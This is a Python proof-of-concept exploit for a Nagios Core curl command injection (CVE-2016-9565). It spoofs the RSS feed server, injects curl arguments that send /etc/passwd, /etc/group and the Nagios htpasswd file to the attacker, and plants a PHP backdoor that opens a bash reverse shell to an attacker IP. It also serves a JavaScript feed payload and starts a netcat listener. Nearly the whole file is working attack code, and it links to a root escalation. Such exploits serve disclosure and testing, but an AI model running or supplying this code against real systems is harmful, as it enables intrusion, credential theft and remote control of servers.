#!/usr/bin/env python
intro = """\033[94m
Nagios Core < 4.2.0 Curl Command Injection / Code Execution PoC Exploit
CVE-2016-9565
nagios_cmd_injection.py ver. 1.0

Discovered & Coded by:

Dawid Golunski
https://legalhackers.com
\033[0m
"""
usage = """
This PoC exploit can allow well-positioned attackers to extract and write 
arbitrary files on the Nagios server which can lead to arbitrary code execution
on Nagios deployments that follow the official Nagios installation guidelines. 

For details, see the full advisory at:
https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html

PoC Video:
https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html

Follow https://twitter.com/dawid_golunski for updates on this advisory.

Remember you can turn the nagios shell into root shell via CVE-2016-9565:
https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html

Usage:

./nagios_cmd_injection.py reverse_shell_ip [reverse_shell_port]

Disclaimer:
For testing purposes only. Do no harm.

"""

import os
import sys
import time
import re
import tornado.httpserver
import tornado.web
import tornado.ioloop

exploited  = 0 
docroot_rw = 0

class MainHandler(tornado.web.RequestHandler):

    def get(self):
	global exploited
	if (exploited == 1):
		self.finish()
	else:
		ua  = self.request.headers['User-Agent']
		if "Magpie" in ua:
			print "[+] Received GET request from Nagios server (%s) ! Sending redirect to inject our curl payload:\n" % self.request.remote_ip
			print  '-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\n'
			self.redirect('https://' + self.request.host + '/nagioshack -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path, permanent=False)
			exploited = 1

    def post(self):        
        global docroot_rw
	print "[+] Success, curl payload injected! Received data back from the Nagios server %s\n" % self.request.remote_ip

	# Extract /etc/passwd from the target 
        passwd = self.request.files['passwd'][0]['body']
	print "[*] Contents of /etc/passwd file from the target:\n\n%s" % passwd

	# Extract /usr/local/nagios/etc/htpasswd.users
        htauth = self.request.files['htauth'][0]['body']
	print "[*] Contents of /usr/local/nagios/etc/htpasswd.users file:\n\n%s" % htauth

	# Extract nagios group from /etc/group
        group = self.request.files['group'][0]['body']
	for line in group.splitlines():
	    if "nagios:" in line:
		nagios_group = line
		print "[*] Retrieved nagios group line from /etc/group file on the target: %s\n" % nagios_group
	if "www-data" in nagios_group:
		print "[+] Happy days, 'www-data' user belongs to 'nagios' group! (meaning writable webroot)\n"
		docroot_rw = 1

	# Put backdoor PHP payload within the 'Server' response header so that it gets properly saved via the curl 'trace-ascii'
	# option. The output trace should contain  an unwrapped line similar to:
	# 
	# == Info: Server <?php system("/bin/bash -c 'nohup bash -i >/dev/tcp/192.168.57.3/8080 0<&1 2>&1 &'"); ?> is not blacklisted
	#
	# which will do the trick as it won't mess up the payload :)
	self.add_header('Server', backdoor)

	# Return XML/feed with JavaScript payload that will run the backdoor code from nagios-backdoor.php via <img src=> tag :)
	print "[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) \n"
	self.write(xmldata)

	self.finish()
	tornado.ioloop.IOLoop.instance().stop()


if __name__ == "__main__":
    global backdoor_path
    global backdoor

    print intro

    # Set attacker's external IP & port to be used by the reverse shell
    if len(sys.argv) < 2 :
	   print usage
	   sys.exit(2)
    attacker_ip   = sys.argv[1]
    if len(sys.argv) == 3 :
	   attacker_port = sys.argv[1]
    else:
	   attacker_port = 8080

    # PHP backdoor to be saved on the target Nagios server
    backdoor_path = '/usr/local/nagios/share/nagios-backdoor.php'
    backdoor = """<?php system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1 &'"); die("stop processing"); ?>""" % (attacker_ip, attacker_port)

    # Feed XML containing JavaScript payload that will load the nagios-backdoor.php script
    global xmldata
    xmldata = """<?xml version="1.0"?>
    <rss version="2.0">
          <channel>
            <title>Nagios feed with injected JS payload</title>
            <item>
              <title>Item 1</title>
              <description>

                &lt;strong&gt;Feed injected. Here we go &lt;/strong&gt; - 
                loading /nagios/nagios-backdoor.php now via img tag... check your netcat listener for nagios shell ;) 

                &lt;img src=&quot;/nagios/nagios-backdoor.php&quot; onerror=&quot;alert('Reverse Shell /nagios/nagios-backdoor.php executed!')&quot;&gt;

              </description>

            </item>

          </channel>
    </rss> """


    # Generate SSL cert
    print "[+] Generating SSL certificate for our python HTTPS web server \n"
    os.system("echo -e '\n\n\n\n\n\n\n\n\n' | openssl req  -nodes -new -x509  -keyout server.key -out server.cert 2>/dev/null")

    print "[+] Starting the web server on ports 80 & 443 \n"
    application = tornado.web.Application([
        (r'/.*', MainHandler)
    ])
    application.listen(80)
    http_server = tornado.httpserver.HTTPServer(
        application, 
        ssl_options = {
            "certfile": os.path.join("./", "server.cert"),
            "keyfile": os.path.join("./", "server.key"),
        }
    )
    http_server.listen(443)

    print "[+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)\n"
    tornado.ioloop.IOLoop.current().start()

    if (docroot_rw == 1):
	    print "[+] PHP backdoor should have been saved in %s on the target by now!\n" % backdoor_path
	    print "[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)\n"
	    os.system("nc -v -l -p 8080")
	    print "\n[+] Shell closed\n"

    print "[+] That's all. Exiting\n"


